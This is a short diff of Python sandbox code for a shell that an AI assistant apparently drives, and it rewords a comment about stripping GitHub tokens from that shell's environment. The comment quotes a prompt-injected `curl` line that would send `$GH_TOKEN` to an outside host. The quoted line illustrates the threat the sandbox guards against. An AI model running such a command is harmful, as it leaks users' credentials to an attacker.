@@ -260,10 +260,8 @@ def _create_pty_session(
     if hidden:
         # The assistant drives this shell, so it starts from the run_sandboxed
         # environment: no GitHub tokens (a prompt-injected
-        # `curl "...?t=$GH_TOKEN"` finds nothing), and under a non-permissive
-        # network tier the egress proxy vars, since its profile denies direct
-        # 80/443. A confined one also sends its npm, pip and uv caches to the
-        # chat session's scratch folder. The user's own terminal keeps their env.
+        # `curl "...?t=$GH_TOKEN"` finds nothing). A confined one also sends
+        # its npm, pip and uv caches to the chat session's scratch folder. The user's own terminal keeps their env.
         from server.sandbox import _merged_env, _scratch_env
 
         env = _merged_env(_scratch_env(write_mode, scratch_dir))
